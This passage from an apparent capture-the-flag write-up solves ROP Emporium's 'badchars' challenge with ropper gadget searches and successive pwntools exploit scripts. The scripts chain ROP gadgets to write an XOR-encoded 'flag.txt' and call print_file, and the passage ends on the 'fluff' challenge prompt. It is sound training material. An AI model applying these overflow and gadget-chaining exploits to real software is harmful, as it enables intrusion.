p = process(elf.path)

offset = 40
payload = b'A' * offset
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
```

We can use `ropper` to find  `mov [r13], r12; ret;`, `pop r12; pop r13; pop r14; pop r15; ret;`, `xor byte ptr [r15], r14b` addresses.

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/barchar]
└─$ ropper -f badchars --search "mov [r13], r12"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [r13], r12

[INFO] File: badchars
0x0000000000400634: mov qword ptr [r13], r12; ret;


┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/barchar]
└─$ ropper -f badchars --search "pop r12; pop r13; pop r14; pop r15; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12; pop r13; pop r14; pop r15; ret

[INFO] File: badchars
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;


┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/barchar]
└─$ ropper -f badchars --search "xor [r15], r14b; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: xor [r15], r14b; ret

[INFO] File: badchars
0x0000000000400628: xor byte ptr [r15], r14b; ret;
```

```python
from pwn import *

# Load the ELF binary and set the architecture context
elf = context.binary = ELF("badchars")
rop = ROP(elf)

# Start the process
p = process(elf.path)

# Offset to control RIP (determined using cyclic pattern)
offset = 40

# ROP gadgets manually found from binary or ROPgadget
# Gadget: pop r12; pop r13; ret;
# We'll use this to set up memory write (r12 = value, r13 = address)
pop_r12_r15 = p64(0x40069c)

# Gadget: mov QWORD PTR [r13], r12; ret;
# Writes the content of r12 into the memory location pointed by r13
mov = p64(0x400634)

# Gadget: xor BYTE PTR [r15], r14b; ret;
# Will be used to fix badchars in memory after writing
xor = p64(0x400628)

# Memory address in .bss where we’ll write our string
bss_addr = 0x601038

# String we want to write to memory for print_file()
data2write = 'flag.txt'

# Bad characters we want to avoid in our payload
badchars = ['x', 'g', 'a', '.']

# Start building the payload
payload = b'A' * offset  # Fills up to RIP

# At this point, you need to:
# 1. XOR-encode 'flag.txt' to avoid badchars
# 2. Write the encoded string to bss_addr
# 3. XOR-decode bad bytes using the xor gadget
# 4. Call print_file(bss_addr)

# Send the payload and interact with the program
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
```

Okay now we can do XOR implementation.

```python
from pwn import *

# Load the ELF binary and set the architecture context
elf = context.binary = ELF("badchars")
rop = ROP(elf)

# Start the process
p = process(elf.path)

# Offset to control RIP (determined using cyclic pattern)
offset = 40

# ROP gadgets manually found from binary or ROPgadget
# Gadget: pop r12; pop r13; ret;
# We'll use this to set up memory write (r12 = value, r13 = address)
pop_r12_r15 = p64(0x40069c)

# Gadget: mov QWORD PTR [r13], r12; ret;
# Writes the content of r12 into the memory location pointed by r13
mov = p64(0x400634)

# Gadget: xor BYTE PTR [r15], r14b; ret;
# Will be used to fix badchars in memory after writing
xor = p64(0x400628)

# Memory address in .bss where we’ll write our string
bss_addr = 0x601038

# String we want to write to memory for print_file()
data2write = 'flag.txt'

# Bad characters we want to avoid in our payload
badchars = ['x', 'g', 'a', '.']

# Start building the payload
payload = b'A' * offset  # Fills up to RIP

# At this point, you need to:
# 1. XOR-encode 'flag.txt' to avoid badchars
# 2. Write the encoded string to bss_addr
# 3. XOR-decode bad bytes using the xor gadget
# 4. Call print_file(bss_addr)

# Send the payload and interact with the program
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
```

```python
from pwn import *

# --------------------------------------------------
# Step 1: Define target binary and start the process
elf = context.binary = ELF("badchars")
rop = ROP(elf)
io = process(elf.path)

# --------------------------------------------------
# Step 2: Define bad characters and helper function

# List of bad characters to avoid in the payload
badchars = ['x', 'g', 'a', '.']

# Function: XORs bad characters in a string with a given key
#   - Returns the XORed string and list of indices where XOR was applied
def xor_string(string, key):
    xor_indxs = []
    output = ""
    for indx, char in enumerate(string):
        if char in badchars:
            nchar = chr(ord(char) ^ key) # `chr` convers integer ASCII back to character and `ord` converts character to its ASCII.
            output += nchar
            xor_indxs.append(indx)
        else:
            output += char
    return bytes(output.encode('latin')), xor_indxs

# --------------------------------------------------
# Step 3: Define useful gadgets and memory locations

# Gadget: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#   - Used to set r12 = string, r13 = destination, r14/r15 = junk or used later
pop_r12_r15 = p64(0x40069c)

# Gadget: mov qword ptr [r13], r12 ; ret
#   - Writes r12 to address pointed by r13
mov = p64(0x400634)

# Gadget: xor byte ptr [r15], r14b ; ret
#   - Used to decode single bytes in memory by XORing with r14b
xor = p64(0x400628)

# Memory: Writable section (.bss) to store our string
bss_addr = 0x601038

# Target string to write (must avoid badchars)
data2write = 'flag.txt'

# Random XOR key to encode badchars in the string
xor_key = 2

# Encode the string using XOR to avoid badchars
xoredstr, xor_offsets = xor_string(data2write, xor_key)

# --------------------------------------------------
# Step 4: Create initial padding to reach return address
# 40 bytes needed to overflow the buffer up to saved RIP
payload = b'A' * 40

# --------------------------------------------------
# Step 5: Write encoded string into memory using gadgets
#   1. pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#   2. r12 = encoded string, r13 = bss_addr
#   3. mov qword ptr [r13], r12 ; ret

payload += pop_r12_r15               # Gadget to load r12–r15
payload += xoredstr                  # r12 = encoded "flag.txt"
payload += p64(bss_addr)             # r13 = destination address (.bss)
payload += p64(0xdeadbeefdeadbeef)   # r14 = junk
payload += p64(0xdeadbeefdeadbeef)   # r15 = junk
payload += mov                       # *r13 = r12 (write to memory)

# --------------------------------------------------
# Step 6: [To be added] XOR specific bytes in memory to decode back to original
#   - Use xor byte ptr [r15], r14b to fix only bytes affected by badchars

# --------------------------------------------------
# Step 7: [To be added] Call print_file with .bss address as argument

# --------------------------------------------------
# Step 8: Send payload and interact with the process
io.recvuntil(b'> ')
io.sendline(payload)
io.interactive()
```

Finally implement inversion and add `pop_rdi` also.

```python
from pwn import *

# --------------------------------------------------
# Step 1: Define target binary and start the process
elf = context.binary = ELF("badchars")
rop = ROP(elf)
io = process(elf.path)

# --------------------------------------------------
# Step 2: Define bad characters and helper function

# List of bad characters to avoid in the payload
badchars = ['x', 'g', 'a', '.']

# Function: XORs bad characters in a string with a given key
#   - Returns the XORed string and list of indices where XOR was applied
def xor_string(string, key):
    xor_indxs = []
    output = ""
    for indx, char in enumerate(string):
        if char in badchars:
            nchar = chr(ord(char) ^ key) # `chr` convers integer ASCII back to character and `ord` converts character to its ASCII.
            output += nchar
            xor_indxs.append(indx)
        else:
            output += char
    return bytes(output.encode('latin')), xor_indxs

# --------------------------------------------------
# Step 3: Define useful gadgets and memory locations

# Gadget: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#   - Used to set r12 = string, r13 = destination, r14/r15 = junk or used later
pop_r12_r15 = p64(0x40069c)

# Gadget: mov qword ptr [r13], r12 ; ret
#   - Writes r12 to address pointed by r13
mov = p64(0x400634)

# Gadget: xor byte ptr [r15], r14b ; ret
#   - Used to decode single bytes in memory by XORing with r14b
xor = p64(0x400628)

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # Find the address of 'pop rdi; ret' gadget dynamically using ROP

# Memory: Writable section (.bss) to store our string
bss_addr = 0x601038

# Target string to write (must avoid badchars)
data2write = 'flag.txt'

# Random XOR key to encode badchars in the string
xor_key = 2

# Encode the string using XOR to avoid badchars
xoredstr, xor_offsets = xor_string(data2write, xor_key)

# --------------------------------------------------
# Step 4: Create initial padding to reach return address
# 40 bytes needed to overflow the buffer up to saved RIP
payload = b'A' * 40

# --------------------------------------------------
# Step 5: Write encoded string into memory using gadgets
#   1. pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#   2. r12 = encoded string, r13 = bss_addr
#   3. mov qword ptr [r13], r12 ; ret

payload += pop_r12_r15               # Gadget to load r12–r15
payload += xoredstr                  # r12 = encoded "flag.txt"
payload += p64(bss_addr)             # r13 = destination address (.bss)
payload += p64(0xdeadbeefdeadbeef)   # r14 = junk
payload += p64(0xdeadbeefdeadbeef)   # r15 = junk
payload += mov                       # *r13 = r12 (write to memory)

# --------------------------------------------------
# Step 6: XOR specific bytes in memory to decode back to original basically inversion.
#   - Use xor byte ptr [r15], r14b to fix only bytes affected by badchars

for i in xor_offsets:
    payload += pop_r12_r15             # Gadget: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    payload += p64(0xdeadbeefdeadbeef)      # Junk for r12 (not used)
    payload += p64(0xdeadbeefdeadbeef)      # Junk for r13 (not used)
    payload += p64(xor_key)                 # r14 = XOR key → goes into r14b
    payload += p64(bss_addr + i)            # r15 = address of the byte to fix
    payload += xor                          # xor byte ptr [r15], r14b ; ret

# --------------------------------------------------
# Step 7: Call print_file with .bss address as argument

payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(elf.plt.print_file)

# --------------------------------------------------
# Step 8: Send payload and interact with the process
io.recvuntil(b'> ')
io.sendline(payload)
io.interactive()
```

Okay so first, the payload creates a buffer overflow with padding to reach the saved return pointer. It uses a ROP gadget that pops values into registers `r12`, `r13`, `r14`, and `r15` to load the XOR-encoded string into `r12` and the writable `.bss` memory address into `r13`. The `mov` gadget then writes this encoded string from `r12` to the `.bss` section in memory. Since the string is encoded, some bytes are still incorrect and correspond to bad characters. To fix these, the payload loops over the positions of these bad characters and uses the `xor` gadget, which XORs a single byte in memory (`[r15]`) with the lower 8 bits of `r14` (`r14b`). It sets `r14` to the XOR key and `r15` to the address of the specific byte in memory that needs to be fixed. This effectively decodes the string back to its original form byte-by-byte. Finally, the payload sets up the argument for `print_file()` by popping the `.bss` address into `rdi` and calls `print_file()` to print the contents of the file `flag.txt`.

I will prolly forget this.
## Fluff

Once we've employed our usual drills of checking protections and searching for interesting symbols & strings, we can think about what we're trying to acheive and plan our chain. A solid approach is to work backwards: we'll need a write gadget - for example `mov [reg], reg` or something equivalent - to make the actual write, so we can start there. There's not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes we'll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. If you're using a gadget finder like ropper, you may need to tell it to search for longer gadgets. **As usual, you'll need to call the `print_file()` function with a path to the flag as its only argument. Some useful(?) gadgets are available at the `questionableGadgets` symbol.**
